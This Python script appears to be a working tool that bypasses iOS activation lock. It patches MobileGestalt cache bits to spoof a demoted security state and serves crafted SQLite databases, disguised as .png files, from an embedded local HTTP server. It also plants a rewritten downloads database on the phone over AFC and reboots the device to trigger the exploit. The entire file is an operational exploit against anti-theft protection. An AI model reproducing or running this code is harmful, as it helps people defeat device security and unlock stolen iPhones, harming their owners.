import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import atexit
import socket
import threading
import zipfile
import tempfile
import binascii
import plistlib
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

# --- CONFIGURATION & CONSTANTS ---

# (SQL Templates removed - using local files from other/bl_sbx/)

# --- CLASSES ---

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'

class LocalServer:
    """
    Embedded HTTP server to serve the generated payloads to the device
    over the local network (Wi-Fi).
    """
    def __init__(self, port=8081):
        self.port = port
        self.serve_dir = tempfile.mkdtemp(prefix="ios_activation_")
        self.local_ip = self.get_local_ip()
        self.thread = None
        self.httpd = None

    def get_local_ip(self):
        """Attempts to find the LAN IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Connect to a public DNS server to determine outgoing interface IP
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def get_all_ips(self):
        """Returns a list of all IP addresses on the host."""
        ips = []
        try:
            # Use hostname to get all IPs
            hostname = socket.gethostname()
            # This might return loopback or just one, so we try to be more thorough if possible
            # but standard python doesn't have a great cross-platform way without netifaces
            # We'll stick to the primary one + manual advice
            return [self.get_local_ip()]
        except:
            return []

    def start(self):
        """Starts the HTTP server in a background thread."""
        os.chdir(self.serve_dir)
        
        # Custom handler to log requests
        class RequestLogger(SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                # Filter out standard logs, print custom colored logs
                sys.stdout.write(f"{Style.DIM}  [HTTP] {self.address_string()} - {format%args}{Style.RESET}\n")

        self.httpd = TCPServer(("", self.port), RequestLogger)
        self.thread = threading.Thread(target=self.httpd.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        
        print(f"{Style.DIM}  ╰─▶ Local Server running at http://{self.local_ip}:{self.port} (Root: {self.serve_dir}){Style.RESET}")
        print(f"{Style.DIM}      (If the phone is on a different subnet, this IP might be wrong. Check your Wi-Fi settings.){Style.RESET}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
        if os.path.exists(self.serve_dir):
            shutil.rmtree(self.serve_dir)

    def get_file_url(self, filename):
        return f"http://{self.local_ip}:{self.port}/{filename}"

class PayloadGenerator:
    """
    Generates the specialized SQLite databases required for the bypass.
    Originally logic from the PHP backend, now ported to Python.
    """
    def __init__(self, server_root, asset_root):
        self.server_root = server_root
        self.asset_root = asset_root

    def _create_db_from_sql(self, sql_content, output_path):
        try:
            # Handle 'unistr' format (Oracle to SQLite conversion for python)
            # Regex: find unistr('...') and convert \uXXXX to chars
            def unistr_sub(match):
                content = match.group(1)
                # Convert \uXXXX to actual unicode characters
                # Note: The SQL dump has \\XXXX format, so we look for 4 hex digits
                decoded = re.sub(r'\\([0-9A-Fa-f]{4})', 
                               lambda m: binascii.unhexlify(m.group(1)).decode('utf-16-be'), 
                               content)
                return f"'{decoded}'"

            sql_content = re.sub(r"unistr\s*\(\s*'([^']*)'\s*\)", unistr_sub, sql_content, flags=re.IGNORECASE)
            
            # Just in case unistr remains (simple cleanup)
            sql_content = re.sub(r"unistr\s*\(\s*('[^']*')\s*\)", r"\1", sql_content, flags=re.IGNORECASE)

            if os.path.exists(output_path): os.remove(output_path)
            
            conn = sqlite3.connect(output_path)
            cursor = conn.cursor()
            cursor.executescript(sql_content)
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f"{Style.RED}DB Gen Error: {e}{Style.RESET}")
            return False

    def generate(self, prd, guid, sn, local_server):
        # Normalize Product ID
        prd_safe = prd.replace(',', '-')
        
        # 1. Locate MobileGestalt
        plist_path = os.path.join(self.asset_root, "assets", "Maker", prd_safe, "com.apple.MobileGestalt.plist")
        if not os.path.exists(plist_path):
            print(f"{Style.RED}[✗] Asset missing: {plist_path}{Style.RESET}")
            return None

        # Generate random token for obfuscation
        token1 = binascii.hexlify(os.urandom(8)).decode()

        # 1.5. PATCH THE PLIST
        temp_plist = os.path.join(self.server_root, f"temp_gestalt_{token1}.plist")
        shutil.copy(plist_path, temp_plist)

        # Try using the compiled gestalt_hax_v2 patcher first
        patcher_bin = os.path.join(os.getcwd(), "other", "gestalt_hax_v2", "patcher")
        patched_via_bin = False
        
        if os.path.exists(patcher_bin):
            print(f"{Style.CYAN}[*]{Style.RESET} Using native gestalt_hax_v2 patcher...")
            try:
                # The patcher takes the plist path as an argument
                res = subprocess.run([patcher_bin, temp_plist], capture_output=True, text=True)
                if res.returncode == 0 and "Patching done" in res.stdout:
                    print(f"{Style.GREEN}[✓]{Style.RESET} Native patcher success")
                    print(f"{Style.DIM}{res.stdout.strip()}{Style.RESET}")
                    patched_via_bin = True
                else:
                    print(f"{Style.YELLOW}[⚠] Native patcher failed/warning: {res.stdout} {res.stderr}{Style.RESET}")
            except Exception as e:
                print(f"{Style.RED}[✗] Native patcher execution error: {e}{Style.RESET}")

        # Fallback to Python patcher if binary failed
        if not patched_via_bin:
            print(f"{Style.YELLOW}[*]{Style.RESET} Falling back to Python patcher...")
            patcher = MobileGestaltPatcher(temp_plist)
            if not patcher.patch_for_activation():
                print(f"{Style.RED}[✗] Failed to patch MobileGestalt{Style.RESET}")
                return None

        # Use the patched plist
        plist_path = temp_plist

        # 2. Create 'fixedfile' (Zipped Plist)
        zip_name = f"payload_{token1}.zip"
        zip_path = os.path.join(self.server_root, zip_name)
        
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.write(plist_path, "Caches/com.apple.MobileGestalt.plist")
        
        # Rename to extensionless file as per original exploit
        fixedfile_name = f"fixedfile_{token1}"
        fixedfile_path = os.path.join(self.server_root, fixedfile_name)
        os.rename(zip_path, fixedfile_path)
        fixedfile_url = local_server.get_file_url(fixedfile_name)

        # --- 3. Prepare BLDatabaseManager.sqlite ---
        # Use the reference file from other/bl_sbx/
        src_bl = os.path.join(os.getcwd(), "other", "bl_sbx", "BLDatabaseManager.sqlite")
        if not os.path.exists(src_bl):
            print(f"{Style.RED}[✗] Reference BLDatabaseManager.sqlite missing in other/bl_sbx/{Style.RESET}")
            return None
            
        token2 = binascii.hexlify(os.urandom(8)).decode()
        bl_db_name = f"belliloveu_{token2}.png"
        bl_db_path = os.path.join(self.server_root, bl_db_name)
        shutil.copy(src_bl, bl_db_path)
        
        bl_url = local_server.get_file_url(bl_db_name)
        
        # Update BL DB
        try:
            conn = sqlite3.connect(bl_db_path)
            c = conn.cursor()
            # Update URL to point to our payload
            # The reference DB uses ZURL for the payload URL
            c.execute("UPDATE ZBLDOWNLOADINFO SET ZURL=? WHERE Z_PK=1", (fixedfile_url,))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"{Style.RED}[✗] Failed to update BLDatabaseManager: {e}{Style.RESET}")
            return None

        # Create dummy WAL/SHM for BL DB (empty files)
        wal_name = f"belliloveu_{token2}_wal.png"
        shm_name = f"belliloveu_{token2}_shm.png"
        with open(os.path.join(self.server_root, wal_name), 'wb') as f: pass
        with open(os.path.join(self.server_root, shm_name), 'wb') as f: pass
        
        wal_url = local_server.get_file_url(wal_name)
        shm_url = local_server.get_file_url(shm_name)

        # --- 4. Prepare downloads.28.sqlitedb ---
        # Use the reference file from other/bl_sbx/
        src_dl = os.path.join(os.getcwd(), "other", "bl_sbx", "downloads.28.sqlitedb")
        if not os.path.exists(src_dl):
            print(f"{Style.RED}[✗] Reference downloads.28.sqlitedb missing in other/bl_sbx/{Style.RESET}")
            return None

        token3 = binascii.hexlify(os.urandom(8)).decode()
        final_db_name = f"downloads_{token3}.sqlitedb"
        final_db_path = os.path.join(self.server_root, final_db_name)
        shutil.copy(src_dl, final_db_path)
        
        # Update Downloads DB
        try:
            conn = sqlite3.connect(final_db_path)
            c = conn.cursor()
            
            # Template GUID to replace
            TEMPLATE_GUID = "3DBBBC39-F5BA-4333-B40C-6996DE48F91C"
            
            # Helper to update asset
            def update_asset(pid, new_url):
                # Get current local_path
                c.execute("SELECT local_path FROM asset WHERE pid=?", (pid,))
                row = c.fetchone()
                if row:
                    curr_path = row[0]
                    if curr_path:
                        new_path = curr_path.replace(TEMPLATE_GUID, guid)
                        c.execute("UPDATE asset SET url=?, local_path=? WHERE pid=?", (new_url, new_path, pid))
                    else:
                        # Fallback if local_path is null (shouldn't happen for these assets)
                        c.execute("UPDATE asset SET url=? WHERE pid=?", (new_url, pid))

            # PID 1234567890: Main DB
            update_asset(1234567890, bl_url)
            # PID 1234567891: SHM
            update_asset(1234567891, shm_url)
            # PID 1234567892: WAL
            update_asset(1234567892, wal_url)
            # PID 1234567893: Metadata (Optional, point to main or dummy)
            update_asset(1234567893, bl_url)
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"{Style.RED}[✗] Failed to update downloads DB: {e}{Style.RESET}")
            return None
        
        return final_db_path

class BypassAutomation:
    def __init__(self):
        self.timeouts = {'asset_wait': 300, 'asset_delete_delay': 15, 'reboot_wait': 300, 'syslog_collect': 180}
        self.mount_point = os.path.join(os.path.expanduser("~"), f".ifuse_mount_{os.getpid()}")
        self.afc_mode = None
        self.device_info = {}
        self.guid = None
        
        # Server Components
        self.server = LocalServer()
        self.generator = PayloadGenerator(self.server.serve_dir, os.getcwd()) # Assets relative to CWD

        atexit.register(self._cleanup)

    def log(self, msg, level='info'):
        if level == 'info': print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
        elif level == 'error': print(f"{Style.RED}[✗]{Style.RESET} {msg}")
        elif level == 'warn': print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
        elif level == 'step':
            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
        elif level == 'detail': print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
        elif level == 'success': print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")

    def _run_cmd(self, cmd, timeout=None):
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return res.returncode, res.stdout.strip(), res.stderr.strip()
        except subprocess.TimeoutExpired as e:
            return 124, (e.stdout or "").strip(), (e.stderr or "").strip()
        except Exception as e: return 1, "", str(e)

    def verify_dependencies(self):
        self.log("Verifying System Requirements...", "step")
        # Check for assets/Maker
        if not os.path.isdir(os.path.join(os.getcwd(), "assets", "Maker")):
            self.log("Missing 'assets/Maker' folder in current directory.", "error")
            sys.exit(1)

        if shutil.which("ifuse"): self.afc_mode = "ifuse"
        else: self.afc_mode = "pymobiledevice3"
        self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")

    def mount_afc(self):
        if self.afc_mode != "ifuse": return True
        os.makedirs(self.mount_point, exist_ok=True)
        code, out, _ = self._run_cmd(["mount"])
        if self.mount_point in out: return True
        for i in range(5):
            if self._run_cmd(["ifuse", self.mount_point])[0] == 0: return True
            time.sleep(2)
        return False

    def unmount_afc(self):
        if self.afc_mode == "ifuse" and os.path.exists(self.mount_point):
            self._run_cmd(["umount", self.mount_point])
            try: os.rmdir(self.mount_point)
            except: pass

    def detect_device(self):
        self.log("Detecting Device...", "step")
        code, out, _ = self._run_cmd(["ideviceinfo"])
        if code != 0: 
            self.log("No device found via USB", "error")
            sys.exit(1)
        
        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        self.device_info = info
        
        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
        print(f"UDID: {info.get('UniqueDeviceID','?')}")
        
        if info.get('ActivationState') == 'Activated':
            print(f"{Style.YELLOW}Warning: Device already activated.{Style.RESET}")

    def cleanup_media_folders(self):
        """
        Cleans Downloads, Books, and iTunes_Control folders to ensure a clean state.
        This mimics the 'Proper' cleanup method from A12Bypass.py.
        """
        self.log("Cleaning device folders (Downloads, Books, iTunes_Control)...", "info")
        
        # Known paths to clean
        folders = ["Downloads", "Books", "iTunes_Control/iTunes"]
        
        # Specific files to target (including potential leftovers)
        targets = [
            "Downloads/downloads.28.sqlitedb",
            "Downloads/downloads.28.sqlitedb-wal",
            "Downloads/downloads.28.sqlitedb-shm",
            "Downloads/record.sqlitedb",
            "Books/asset.epub",
            "iTunes_Control/iTunes/iTunesMetadata.plist"
        ]

        if self.afc_mode == "ifuse":
            self.mount_afc()
            # Clean specific targets
            for t in targets:
                path = os.path.join(self.mount_point, t)
                if os.path.exists(path):
                    try:
                        os.remove(path)
                        self.log(f"Deleted {t}", "detail")
                    except Exception as e:
                        self.log(f"Failed to delete {t}: {e}", "detail")
            
            # Try to clean folders (non-recursive for safety, just files)
            for folder in folders:
                full_path = os.path.join(self.mount_point, folder)
                if os.path.exists(full_path):
                    for f in os.listdir(full_path):
                        file_path = os.path.join(full_path, f)
                        if os.path.isfile(file_path):
                            try:
                                os.remove(file_path)
                            except: pass
        else:
            # pymobiledevice3 mode
            # 1. Remove specific targets
            for t in targets:
                self._run_cmd(["pymobiledevice3", "afc", "rm", t])
            
            # 2. List and remove files in target folders
            for folder in folders:
                code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", folder])
                if code == 0:
                    for line in out.splitlines():
                        fname = line.strip()
                        if fname not in ['.', '..', '']:
                            self._run_cmd(["pymobiledevice3", "afc", "rm", f"{folder}/{fname}"])

        self.log("Device folders cleaned.", "success")

    def get_guid(self):
        self.log("Extracting GUID (Robust Method)...", "step")
        
        # 1. Clean folders first (Crucial step from A12Bypass.py)
        self.cleanup_media_folders()
        
        # 2. Collect Log Archive
        self.log("Collecting system logs (this may take a moment)...", "info")
        udid = self.device_info['UniqueDeviceID']
        log_path = f"{udid}.logarchive"
        if os.path.exists(log_path): shutil.rmtree(log_path)
        
        # Increased timeout for log collection
        self._run_cmd(["pymobiledevice3", "syslog", "collect", log_path], timeout=180)
        
        if os.path.exists(log_path):
            tmp = "final.logarchive"
            if os.path.exists(tmp): shutil.rmtree(tmp)
            shutil.move(log_path, tmp)
            
            self.log("Parsing logs for BLDatabaseManager...", "detail")
            # Use 'log show' to filter for relevant entries
            _, logs, _ = self._run_cmd(["/usr/bin/log", "show", "--style", "syslog", "--archive", tmp, "--predicate", 'process == "mobileactivationd" OR process == "itunesstored"'])
            
            # Also try a broader search if the predicate misses it
            if "BLDatabaseManager" not in logs:
                 _, logs, _ = self._run_cmd(["/usr/bin/log", "show", "--style", "syslog", "--archive", tmp])

            shutil.rmtree(tmp)
            
            # Regex to find the GUID in the path
            # Pattern: SystemGroup/<GUID>/Documents/BLDatabaseManager
            guid_pattern = re.compile(r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/')
            
            for line in logs.splitlines():
                if "BLDatabaseManager" in line:
                    match = guid_pattern.search(line)
                    if match: 
                        found = match.group(1).upper()
                        self.log(f"Found GUID: {found}", "success")
                        return found
                    
        self.log("Could not find GUID in logs.", "error")
        return None

    def run(self):
        os.system('clear')
        print(f"{Style.BOLD}{Style.MAGENTA}iOS Offline Activator (Python Edition){Style.RESET}\n")
        
        self.verify_dependencies()
        self.server.start() # Start HTTP server
        self.detect_device()
        
        print(f"{Style.YELLOW}Starting in 5 seconds...{Style.RESET}")
        time.sleep(5)
        
        # 1. Reboot
        self.log("Rebooting device...", "step")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        time.sleep(30)
        
        # 2. Get GUID
        self.guid = self.get_guid()
        if not self.guid:
            self.log("Could not find GUID in logs.", "error")
            sys.exit(1)
        self.log(f"GUID: {self.guid}", "success")
        
        # 3. Generate Payloads (Offline Logic)
        self.log("Generating Payload (Offline)...", "step")
        final_db_path = self.generator.generate(
            self.device_info['ProductType'], 
            self.guid, 
            self.device_info['SerialNumber'],
            self.server
        )
        
        if not final_db_path:
            self.log("Payload generation failed.", "error")
            sys.exit(1)
        self.log("Payload Generated Successfully.", "success")

        # 4. Upload
        self.log("Uploading...", "step")
        target_base = "/Downloads/downloads.28.sqlitedb"
        
        # Cleanup old files (Important: remove WAL/SHM to prevent SQLite corruption)
        files_to_remove = [target_base, target_base + "-shm", target_base + "-wal"]
        
        if self.afc_mode == "ifuse":
            self.mount_afc()
            for f in files_to_remove:
                fpath = self.mount_point + f
                if os.path.exists(fpath): os.remove(fpath)
            
            # Copy new file
            shutil.copy(final_db_path, self.mount_point + target_base)
        else:
            for f in files_to_remove:
                self._run_cmd(["pymobiledevice3", "afc", "rm", f])
            
            self._run_cmd(["pymobiledevice3", "afc", "push", final_db_path, target_base])
            
        self.log("Payload Deployed.", "success")
        
        # 5. Execution Sequence
        print(f"\n{Style.YELLOW}{Style.BOLD}IMPORTANT: Ensure the device is connected to the SAME Wi-Fi as this computer!{Style.RESET}")
        print(f"Server IP: {self.server.local_ip}")
        
        # Wait 30 seconds before first reboot (as per A12Bypass.py recommendation)
        self.log("Waiting 30 seconds before first reboot to ensure filesystem sync...", "info")
        time.sleep(30)

        self.log("Rebooting (Stage 1/2)...", "step")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        
        self.log("Waiting for device to reboot (90s)...", "info")
        time.sleep(90)
        
        # Wait for device to be detected again
        self.log("Waiting for USB connection...", "detail")
        while True:
            if self._run_cmd(["ideviceinfo"])[0] == 0: break
            time.sleep(5)
        self.log("Device reconnected.", "success")

        self.log("Rebooting (Stage 2/2) - Triggering Exploit...", "step")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        
        print(f"\n{Style.GREEN}Process Complete. Device should activate after this reboot.{Style.RESET}")
        
        # Check Activation State
        self.log("Checking Activation State in 60 seconds...", "info")
        time.sleep(60)
        code, out, _ = self._run_cmd(["ideviceinfo"])
        if "ActivationState: Activated" in out:
             print(f"\n{Style.BOLD}{Style.GREEN}🎉 DEVICE ACTIVATED SUCCESSFULLY! 🎉{Style.RESET}")
        else:
             print(f"\n{Style.YELLOW}Device not yet activated (or check failed). You may need to try again or wait longer.{Style.RESET}")
             # Print actual state for debugging
             for line in out.splitlines():
                 if "ActivationState" in line:
                     print(f"Current Status: {line.strip()}")

        # Keep script alive for server to serve files if needed by device immediately
        self.log("Keeping server alive for 30s to ensure downloads complete...", "info")
        self.log("Watch for [HTTP] requests below. If none appear, the device isn't connecting.", "detail")
        try:
            time.sleep(30)
        except KeyboardInterrupt:
            print("\nStopping server...")
        
        self._cleanup()

    def _cleanup(self): 
        self.unmount_afc()
        self.server.stop()

class MobileGestaltPatcher:
    """
    Patches MobileGestalt CacheData to spoof AP demotion.
    This makes mobileactivationd skip normal activation checks.
    """
    
    def __init__(self, plist_path):
        self.plist_path = plist_path
        self.plist_data = None
        self.cache_data = None
        
    def patch_for_activation(self):
        """Main entry point - load, patch, save."""
        try:
            # Load plist
            with open(self.plist_path, 'rb') as f:
                self.plist_data = plistlib.load(f)
            
            if 'CacheData' not in self.plist_data:
                print(f"{Style.YELLOW}[⚠] No CacheData found, creating new one{Style.RESET}")
                self.plist_data['CacheData'] = bytearray(2048)
            
            self.cache_data = bytearray(self.plist_data['CacheData'])
            
            # Patch demotion bits
            print(f"{Style.CYAN}[*]{Style.RESET} Patching CacheData for AP demotion...")
            self._patch_demotion_bits()
            
            # Save back
            self.plist_data['CacheData'] = bytes(self.cache_data)
            with open(self.plist_path, 'wb') as f:
                plistlib.dump(self.plist_data, f)
            
            print(f"{Style.GREEN}[✓]{Style.RESET} MobileGestalt patched successfully")
            return True
            
        except Exception as e:
            print(f"{Style.RED}[✗] Patcher error: {e}{Style.RESET}")
            return False
    
    def _patch_demotion_bits(self):
        """Set the critical demotion bits in CacheData."""
        # Known offset patterns for different iOS versions
        # Format: [EffectiveProductionStatusAp, CertificateProductionStatus, EffectiveSecurityModeSEP, CertificateSecurityMode]
        patterns = {
            "iOS 15-17": [0x1C8, 0x1C9, 0x1CA, 0x1CB],
            "iOS 18+":   [0x1D0, 0x1D1, 0x1D2, 0x1D3],
            "Legacy":    [0x200, 0x201, 0x202, 0x203]
        }
        
        patched_count = 0
        for name, offsets in patterns.items():
            # Safety check: Ensure file is large enough
            if len(self.cache_data) <= max(offsets):
                continue

            # Heuristic: Check if values look like valid status flags (0 or 1 usually)
            # EffectiveProductionStatusAp is usually 1 (Production)
            val = self.cache_data[offsets[0]]
            if val not in [0, 1]:
                print(f"{Style.DIM}  ╰─▶ Skipping {name} pattern (Value {val} at {hex(offsets[0])} doesn't look like a status flag){Style.RESET}")
                continue

            print(f"{Style.CYAN}[*]{Style.RESET} Applying {name} patch pattern...")
            
            # Set demotion pattern
            self.cache_data[offsets[0]] |= 0x08  # EffectiveProductionStatusAp |= 1 (Demoted)
            self.cache_data[offsets[1]] &= 0xDF  # CertificateProductionStatus
            self.cache_data[offsets[2]] &= 0xFD  # EffectiveSecurityModeSEP
            self.cache_data[offsets[3]] &= 0x7F  # CertificateSecurityMode
            patched_count += 1
        
        if patched_count == 0:
            print(f"{Style.YELLOW}[⚠] Warning: No suitable offset pattern found. Patching blindly at default (iOS 15-17)...{Style.RESET}")
            # Fallback to default
            offsets = patterns["iOS 15-17"]
            if len(self.cache_data) > max(offsets):
                self.cache_data[offsets[0]] |= 0x08
                self.cache_data[offsets[1]] &= 0xDF
                self.cache_data[offsets[2]] &= 0xFD
                self.cache_data[offsets[3]] &= 0x7F
        else:
            print(f"{Style.DIM}  ╰─▶ Demotion bits set using {patched_count} pattern(s){Style.RESET}")

if __name__ == "__main__":
    try:
        BypassAutomation().run()
    except KeyboardInterrupt:
        sys.exit(130)
    except Exception as e:
        print(f"Fatal Error: {e}")
        sys.exit(1)
